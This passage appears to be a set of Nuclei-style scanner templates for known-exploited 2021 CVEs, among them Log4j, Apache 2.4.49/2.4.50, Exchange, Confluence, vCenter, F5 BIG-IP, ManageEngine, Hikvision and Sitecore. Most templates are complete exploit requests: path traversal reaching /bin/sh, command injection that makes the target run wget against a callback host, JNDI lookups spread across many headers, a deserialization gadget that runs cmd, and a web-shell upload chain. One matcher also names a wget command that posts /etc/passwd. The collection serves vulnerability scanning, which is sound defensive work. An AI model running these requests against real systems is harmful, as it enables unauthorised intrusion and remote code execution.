**Type - word**

- part - body
- words
  1. wget --post-file /etc/passwd {{interactsh-url}}
  2. name
  3. running
  4. pids
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Exchange Server - Remote Code Execution

## Description

- Microsoft Exchange Server is vulnerable to a remote code execution vulnerability. This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.

- severity - critical
- tags - cve,cve2021,ssrf,rce,exchange,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
- {{BaseURL}}/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com

### Matchers

**Type - word**

- part - body
- condition - or
- words
  1. Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException
  2. Exchange MAPI/HTTP Connectivity Endpoint

---

# Atlassian Confluence Server - Local File Inclusion

## Description

- Atlassian Confluence Server allows remote attackers to view restricted resources via local file inclusion in the /s/ endpoint.
- severity - medium
- tags - kev,packetstorm,cve,cve2021,confluence,atlassian,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/s/{{randstr}}/\_/;/WEB-INF/web.xml

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. \<display-name>Confluence\</display-name>
  2. com.atlassian.confluence.setup.ConfluenceAppConfig
- condition - and

---

# VMware vCenter Server - Arbitrary File Upload

## Description

- VMware vCenter Server contains an arbitrary file upload vulnerability in the Analytics service. A malicious actor with network access to port 443 on vCenter Server may exploit this issue to execute code on vCenter Server by uploading a specially crafted file.
- severity - critical
- tags - cve,cve2021,vmware,vcenter,fileupload,kev,intrusive

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /analytics/telemetry/ph/api/hyper/send?_c&_i=test HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

test_data

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1 == 200
  2. status_code_2 == 201
  3. contains(body_1, 'VMware vSphere')
  4. content_length_2 == 0
- condition - and

---

# Microsoft Open Management Infrastructure - Remote Code Execution

## Description

- Microsoft Open Management Infrastructure is susceptible to remote code execution (OMIGOD).
- severity - critical
- tags - cve,cve2021,rce,omi,microsoft,kev

## Requests

### Step - 1

```
POST /wsman HTTP/1.1
Host: {{Hostname}}
Content-Type: application/soap+xml;charset=UTF-8

<s:Envelope
  xmlns:s="http://www.w3.org/2003/05/soap-envelope"
  xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
  xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
  xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema"
  xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
  xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:To>HTTP://{{Hostname}}/wsman/</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
    <a:ReplyTo>
      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
    <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>
    <w:OperationTimeout>PT1M30S</w:OperationTimeout>
    <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
    <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
    <w:OptionSet s:mustUnderstand="true"/>
    <w:SelectorSet>
      <w:Selector Name="__cimnamespace">root/scx</w:Selector>
    </w:SelectorSet>
  </s:Header>
  <s:Body>
    <p:ExecuteScript_INPUT
      xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
      <p:Script>aWQ=</p:Script>
      <p:Arguments/>
      <p:timeout>0</p:timeout>
      <p:b64encoded>true</p:b64encoded>
    </p:ExecuteScript_INPUT>
  </s:Body>
</s:Envelope>

```

### Matchers

**Type - word**

- words
  1. \<p:StdOut>
  2. uid=0(root) gid=0(root) groups=0
- condition - and

---

# BillQuick Web Suite SQL Injection

## Description

- BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1 allows SQL injection for unauthenticated remote code execution. Successful exploitation can include the ability to execute arbitrary code as MSSQLSERVER$ via xp_cmdshell.
- severity - critical
- tags - cve,cve2021,sqli,billquick,kev

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST / HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode("Â{{VSÂ}}")}}&__VIEWSTATEGENERATOR={{url_encode("Â{{VSGÂ}}")}}&__EVENTVALIDATION={{url_encode("Â{{EVÂ}}")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96

```

### Matchers

**Type - word**

- part - body
- condition - and
- words
  1. System.Data.SqlClient.SqlException
  2. Incorrect syntax near
  3. \_ACCOUNTLOCKED

### Extractors

**Type - xpath**

- name - VS
- internal - True
- attribute - value
- xpath
  1. /html/body/form/div/input[@id='__VIEWSTATE']

**Type - xpath**

- name - VSG
- internal - True
- attribute - value
- xpath
  1. /html/body/form/div/input[@id='__VIEWSTATEGENERATOR']

**Type - xpath**

- name - EV
- internal - True
- attribute - value
- xpath
  1. /html/body/form/div/input[@id='__EVENTVALIDATION']

---

# Zoho ManageEngine ADSelfService Plus v6113 - Unauthenticated Remote Command Execution

## Description

- Zoho ManageEngine ADSelfService Plus version 6113 and prior are vulnerable to a REST API authentication bypass vulnerability that can lead to remote code execution.
- severity - critical
- tags - cve,cve2021,rce,ad,intrusive,manageengine,kev

## Requests

### Step - 1

```
POST /./RestAPI/LogonCustomization HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=8b1ab266c41afb773af2e064bc526458

--8b1ab266c41afb773af2e064bc526458
Content-Disposition: form-data; name="methodToCall"

unspecified
--8b1ab266c41afb773af2e064bc526458
Content-Disposition: form-data; name="Save"

yes
--8b1ab266c41afb773af2e064bc526458
Content-Disposition: form-data; name="form"

smartcard
--8b1ab266c41afb773af2e064bc526458
Content-Disposition: form-data; name="operation"

Add
--8b1ab266c41afb773af2e064bc526458
Content-Disposition: form-data; name="CERTIFICATE_PATH"; filename="ws.jsp"

<%@ page import="java.util.*,java.io.*"%>
<%@ page import="java.security.MessageDigest"%>
<%
String cve = "CVE-2021-40539";
MessageDigest alg = MessageDigest.getInstance("MD5");
alg.reset();
alg.update(cve.getBytes());
byte[] digest = alg.digest();
StringBuffer hashedpasswd = new StringBuffer();
String hx;
for (int i=0;i<digest.length;i++){
  hx =  Integer.toHexString(0xFF & digest[i]);
  if(hx.length() == 1){hx = "0" + hx;}
  hashedpasswd.append(hx);
}
out.println(hashedpasswd.toString());
%>
--8b1ab266c41afb773af2e064bc526458--

```

### Step - 2

```
POST /./RestAPI/LogonCustomization HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=43992a07d9a30213782780204a9f032b

--43992a07d9a30213782780204a9f032b
Content-Disposition: form-data; name="methodToCall"

unspecified
--43992a07d9a30213782780204a9f032b
Content-Disposition: form-data; name="Save"

yes
--43992a07d9a30213782780204a9f032b
Content-Disposition: form-data; name="form"

smartcard
--43992a07d9a30213782780204a9f032b
Content-Disposition: form-data; name="operation"

Add
--43992a07d9a30213782780204a9f032b
Content-Disposition: form-data; name="CERTIFICATE_PATH"; filename="Si.class"

{{hex_decode('CAFEBABE0000003400280D0A000C00160D0A0017001807001908001A08001B08001C08001D08001E0D0A0017001F0700200700210700220100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100083C636C696E69743E01000D0A537461636B4D61705461626C6507002001000D0A536F7572636546696C6501000753692E6A6176610C000D0A000E0700230C002400250100106A6176612F6C616E672F537472696E67010003636D640100022F63010004636F707901000677732E6A737001002A2E2E5C776562617070735C61647373705C68656C705C61646D696E2D67756964655C746573742E6A73700C002600270100136A6176612F696F2F494F457863657074696F6E01000253690100106A6176612F6C616E672F4F626A6563740100116A6176612F6C616E672F52756E74696D6501000D0A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0021000B000C0000000000020001000D0A000E0001000F0000001D00010001000000052AB70001B10000000100100000000600010000000200080011000E0001000F00000064000500020000002BB800024B2A08BD000359031204535904120553590512065359061207535907120853B600094CA700044BB10001000000260029000D0A00020010000000120004000000050004000600260007002A00080012000000070002690700130000010014000000020015')}}
--43992a07d9a30213782780204a9f032b--

```

### Step - 3

```
POST /./RestAPI/Connection HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

methodToCall=openSSLTool&action=generateCSR&KEY_LENGTH=1024+-providerclass+Si+-providerpath+%22..%5Cbin%22

```

### Step - 4

```
GET /help/admin-guide/test.jsp HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- words
  1. 114f7ce498a54a1be1de1f1e5731d0ea

**Type - status**

- status
  1. 200

---

# Zoho ManageEngine Desktop Central - Remote Code Execution

## Description

- Zoho ManageEngine Desktop Central contains an authentication bypass vulnerability that could allow an attacker to execute arbitrary code in the Desktop Central MSP server.
- severity - critical
- tags - cve,cve2021,zoho,rce,manageengine,kev

## Requests

### Step - 1

```
GET /STATE_ID/123/agentLogUploader HTTP/1.1
Host: {{Hostname}}
Cookie: STATE_COOKIE=&_REQS/_TIME/123

```

### Matchers

**Type - status**

- status
  1. 200

**Type - dsl**

- dsl
  1. len(body) == 0

**Type - word**

- part - header
- words
  1. UEMJSESSIONID=

---

# Hikvision IP camera/NVR - Remote Command Execution

## Description

- Certain Hikvision products contain a command injection vulnerability in the web server due to the insufficient input validation. An attacker can exploit the vulnerability to launch a command injection attack by sending some messages with malicious commands.
- severity - critical
- tags - cve,cve2021,hikvision,rce,iot,intrusive,kev

## Requests

### Step - 1

```
PUT /SDK/webLanguage HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?><language>$(id>webLib/x)</language>

```

### Step - 2

```
GET /x HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2,'uid=') && contains(body_2,'gid=')
  2. status_code_1 == 500 && status_code_2 == 200
- condition - and

### Extractors

**Type - regex**

- regex
  1. (u|g)id=.\*

---

# VMware vSphere Client (HTML5) - Remote Code Execution

## Description

- VMware vCenter vSphere Client (HTML5) contains a remote code execution vulnerability in a vCenter Server plugin. A malicious actor with network access to port 443 may exploit this issue to execute commands with unrestricted privileges on the underlying operating system that hosts vCenter Server. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l and 6.5 before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and 3.x before 3.10.1.2).
- severity - critical
- tags - cve2021,vmware,rce,vcenter,kev,packetstorm,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/ui/vropspluginui/rest/services/getstatus

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. VSPHERE-UI-JSESSIONID
- part - header
- condition - and

**Type - regex**

- regex
  1. (Install|Config) Final Progress
- part - body

---

# Apache 2.4.49 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
- severity - high
- tags - cve,cve2021,lfi,rce,apache,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}

```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-41773-POC

---

# Cisco HyperFlex HX Data Platform - Remote Command Execution

## Description

- Cisco HyperFlex HX contains multiple vulnerabilities in the web-based management interface that could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
- severity - critical
- tags - cisco,rce,oast,kev,packetstorm,cve,cve2021

## Requests

### Step - 1

```
POST /auth/change HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

username=root&password={{url_encode('123\",\"$6$$\"));import os;os.system(\"wget http://{{interactsh-url}}\");print(crypt.crypt(\"')}}

```

### Step - 2

```
POST /auth HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

username=root&password={{url_encode('123\",\"$6$$\"));import os;os.system(\"wget http://{{interactsh-url}}\");print(crypt.crypt(\"')}}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Sitecore Experience Platform Pre-Auth RCE

## Description

- Sitecore XP 7.5 to Sitecore XP 8.2 Update 7 is vulnerable to an insecure deserialization attack where remote commands can be executed by an attacker with no authentication or special configuration required.
- severity - critical
- tags - cve,cve2021,rce,sitecore,deserialization,oast,kev

## Requests

### Step - 1

```
POST /sitecore/shell/ClientBin/Reporting/Report.ashx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml

<?xml version="1.0" ?>
<a>
    <query></query>
    <source>foo</source>
    <parameters>
        <parameter name="">
            <ArrayOfstring z:Id="1" z:Type="System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]" z:Assembly="System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"
                xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:x="http://www.w3.org/2001/XMLSchema"
                xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/">
                <Count z:Id="2" z:Type="System.Int32" z:Assembly="0"
                    xmlns="">2</Count>
                <Comparer z:Id="3" z:Type="System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]" z:Assembly="0"
                    xmlns="">
                    <_comparison z:Id="4" z:FactoryType="a:DelegateSerializationHolder" z:Type="System.DelegateSerializationHolder" z:Assembly="0"
                        xmlns="http://schemas.datacontract.org/2004/07/System.Collections.Generic"
                        xmlns:a="http://schemas.datacontract.org/2004/07/System">
                        <Delegate z:Id="5" z:Type="System.DelegateSerializationHolder+DelegateEntry" z:Assembly="0"
                            xmlns="">
                            <a:assembly z:Id="6">mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:assembly>
                            <a:delegateEntry z:Id="7">
                                <a:assembly z:Ref="6" i:nil="true"/>
                                <a:delegateEntry i:nil="true"/>
                                <a:methodName z:Id="8">Compare</a:methodName>
                                <a:target i:nil="true"/>
                                <a:targetTypeAssembly z:Ref="6" i:nil="true"/>
                                <a:targetTypeName z:Id="9">System.String</a:targetTypeName>
                                <a:type z:Id="10">System.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</a:type>
                            </a:delegateEntry>
                            <a:methodName z:Id="11">Start</a:methodName>
                            <a:target i:nil="true"/>
                            <a:targetTypeAssembly z:Id="12">System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</a:targetTypeAssembly>
                            <a:targetTypeName z:Id="13">System.Diagnostics.Process</a:targetTypeName>
                            <a:type z:Id="14">System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</a:type>
                        </Delegate>
                        <method0 z:Id="15" z:FactoryType="b:MemberInfoSerializationHolder" z:Type="System.Reflection.MemberInfoSerializationHolder" z:Assembly="0"
                            xmlns=""
                            xmlns:b="http://schemas.datacontract.org/2004/07/System.Reflection">
                            <Name z:Ref="11" i:nil="true"/>
                            <AssemblyName z:Ref="12" i:nil="true"/>
                            <ClassName z:Ref="13" i:nil="true"/>
                            <Signature z:Id="16" z:Type="System.String" z:Assembly="0">System.Diagnostics.Process Start(System.String, System.String)</Signature>
                            <Signature2 z:Id="17" z:Type="System.String" z:Assembly="0">System.Diagnostics.Process Start(System.String, System.String)</Signature2>
                            <MemberType z:Id="18" z:Type="System.Int32" z:Assembly="0">8</MemberType>
                            <GenericArguments i:nil="true"/>
                        </method0>
                        <method1 z:Id="19" z:FactoryType="b:MemberInfoSerializationHolder" z:Type="System.Reflection.MemberInfoSerializationHolder" z:Assembly="0"
                            xmlns=""
                            xmlns:b="http://schemas.datacontract.org/2004/07/System.Reflection">
                            <Name z:Ref="8" i:nil="true"/>
                            <AssemblyName z:Ref="6" i:nil="true"/>
                            <ClassName z:Ref="9" i:nil="true"/>
                            <Signature z:Id="20" z:Type="System.String" z:Assembly="0">Int32 Compare(System.String, System.String)</Signature>
                            <Signature2 z:Id="21" z:Type="System.String" z:Assembly="0">System.Int32 Compare(System.String, System.String)</Signature2>
                            <MemberType z:Id="22" z:Type="System.Int32" z:Assembly="0">8</MemberType>
                            <GenericArguments i:nil="true"/>
                        </method1>
                    </_comparison>
                </Comparer>
                <Version z:Id="23" z:Type="System.Int32" z:Assembly="0"
                    xmlns="">2</Version>
                <Items z:Id="24" z:Type="System.String[]" z:Assembly="0" z:Size="2"
                    xmlns="">
                    <string z:Id="25"
                        xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">/c nslookup {{interactsh-url}}</string>
                    <string z:Id="26"
                        xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays">cmd</string>
                </Items>
            </ArrayOfstring>
        </parameter>
    </parameters>
</a>

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - word**

- part - body
- words
  1. System.ArgumentNullException

---

# Apache Log4j2 Remote Code Injection

## Description

- Apache Log4j2 \<=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

- severity - critical
- tags - cve,cve2021,rce,oast,log4j,injection,kev

## Requests

### Step - 1

```
GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET / HTTP/1.1
Host: {{Hostname}}
Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
Access-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}
Access-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}
Authentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}
Authentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}
Cookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}
Location: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}
Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
Upgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}
User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
X-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
X-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}
X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
X-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - regex**

- part - interactsh_request
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

### Extractors

**Type - kval**

- kval
  1. interactsh_ip

**Type - regex**

- part - interactsh_request
- group - 2
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

**Type - regex**

- part - interactsh_request
- group - 1
- regex
  1. ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+

---

# SonicWall SMA100 Stack - Buffer Overflow/Remote Code Execution

## Description

- A Stack-based buffer overflow vulnerability in SMA100 Apache httpd server's mod_cgi module environment variables allows a remote unauthenticated attacker to potentially execute code as a 'nobody' user in the appliance. This vulnerability affected SMA 200, 210, 400, 410 and 500v appliances firmware 10.2.0.8-37sv, 10.2.1.1-19sv, 10.2.1.2-24sv and earlier versions.
- severity - critical
- tags - cve,cve2021,overflow,rce,sonicwall,kev

## Requests

### Step - 1

```
GET /{{prefix_addr}}{{system_addr}};{wget,http://{{interactsh-url}}};{{prefix_addr}}{{system_addr}};{wget,http://{{interactsh-url}}};?{{repeat("A", 518)}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Payloads**- prefix_addr

- system_addr

---

# F5 BIG-IP iControl REST unauthenticated RCE

## Description

- The iControl REST interface has an unauthenticated remote command execution vulnerability.
- severity - critical
- tags - bigip,cve,cve2021,rce,kev,packetstorm

## Requests

### Step - 1

```
POST /mgmt/shared/authn/login HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Authorization: Basic YWRtaW46
Content-Type: application/json
Cookie: BIGIPAuthCookie=1234
Connection: close

{"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}

```

### Step - 2

```
POST /mgmt/tm/util/bash HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
X-F5-Auth-Token: {{token}}
Content-Type: application/json
Connection: close

{"command":"run","utilCmdArgs":"-c id"}

```

### Matchers

**Type - word**

- words
  1. commandResult
  2. uid=
- condition - and

### Extractors

**Type - regex**

- part - body
- internal - True
- name - token
- group - 1
- regex
  1. ([A-Z0-9]{26})

**Type - regex**

- part - body
- group - 1
- regex
  1. "commandResult":"(.\*)"

---

# Cisco HyperFlex HX Data Platform - Remote Command Execution

## Description

- Cisco HyperFlex HX contains multiple vulnerabilities in the web-based management interface that could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
- severity - critical
- tags - kev,packetstorm,cve,cve2021,cisco,rce,oast,mirai

## Requests

### Step - 1

```
POST /storfs-asup HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: application/x-www-form-urlencoded

action=&token=`wget http://{{interactsh-url}}`&mode=`wget http://{{interactsh-url}}`

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# vRealize Operations Manager API - Server-Side Request Forgery

## Description

- vRealize Operations Manager API is susceptible to server-side request forgery. A malicious actor with network access to the vRealize Operations Manager API can steal administrative credentials or trigger remote code execution using CVE-2021-21983.
- severity - high
- tags - kev,packetstorm,cve,cve2021,ssrf,vmware,vrealize

## Requests

### Step - 1

```
POST /casa/nodes/thumbprints HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

["127.0.0.1:443/ui/"]

```

### Matchers

**Type - word**

- part - body
- words
  1. vRealize Operations Manager
  2. thumbprint
  3. address
- condition - and

**Type - status**

- status
  1. 200

---

# Grafana Snapshot - Authentication Bypass

## Description

- Grafana instances up to 7.5.11 and 8.1.5 allow remote unauthenticated users to view the snapshot associated with the lowest database key by accessing the literal paths /api/snapshot/:key or /dashboard/snapshot/:key. If the snapshot is in public mode, unauthenticated users can delete snapshots by accessing the endpoint /api/snapshots-delete/:deleteKey. Authenticated users can also delete snapshots by accessing the endpoints /api/snapshots-delete/:deleteKey, or sending a delete request to /api/snapshot/:key, regardless of whether or not the snapshot is set to public mode (disabled by default).
- severity - high
- tags - cve,cve2021,grafana,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/snapshots/:key

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. "isSnapshot":true

---

# ForgeRock OpenAM \<7.0 - Remote Code Execution

## Description

- ForgeRock AM server before 7.0 has a Java deserialization vulnerability in the jato.pageSession parameter on multiple pages.
  The exploitation does not require authentication, and remote code execution can be triggered by sending a single crafted
  /ccversion/\* request to the server. The vulnerability exists due to the usage of Sun ONE Application Framework (JATO)
  found in versions of Java 8 or earlier.

- severity - critical
- tags - cve,cve2021,openam,rce,java,kev,cisa,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/openam/oauth2/..;/ccversion/Version

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. Set-Cookie: JSESSIONID=
- part - header

**Type - word**

- words
  1. Version Information -
  2. openam/ccversion/Masthead.jsp
- part - body
- condition - or

---

# Confluence Server - Remote Code Execution

## Description

- Confluence Server and Data Center contain an OGNL injection vulnerability that could allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if 'Allow people to sign up to create their account' is enabled. To check whether this is enabled go to COG > User Management > User Signup Options.
- severity - critical
- tags - cve,cve2021,rce,confluence,injection,ognl,kev

## Requests

### Step - 1

```
POST /{{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

queryString=aaaa\u0027%2b#{16*8787}%2b\u0027bbb

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - body
- words
  1. value="aaaa{140592=null}

**Payloads**- path

---

# Oracle Access Manager - Remote Code Execution

## Description

- The Oracle Access Manager portion of Oracle Fusion Middleware (component: OpenSSO Agent) is vulnerable to remote code execution. Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. This is an easily exploitable vulnerability that allows unauthenticated attackers with network access via HTTP to compromise Oracle Access Manager.

- severity - critical
- tags - cve,cve2021,oam,rce,java,unauth,oracle,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/oam/server/opensso/sessionservice

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. x-oracle-dms-ecid
  2. x-oracle-dms-rid
- condition - or
- case-insensitive - True

**Type - word**

- part - body
- words
  1. /oam/pages/css/general.css

---

# Apache 2.4.49/2.4.50 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. In certain configurations, for instance if mod_cgi is enabled, this flaw can lead to remote code execution. This issue only affects Apache 2.4.49 and 2.4.50 and not earlier versions. Note - CVE-2021-42013 is due to an incomplete fix for the original vulnerability CVE-2021-41773.

- severity - critical
- tags - cve,cve2021,lfi,apache,rce,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 2

```
GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}


```

### Step - 3

```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}


```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-42013

---

# VMware vSphere Client (HTML5) - Remote Code Execution

## Description

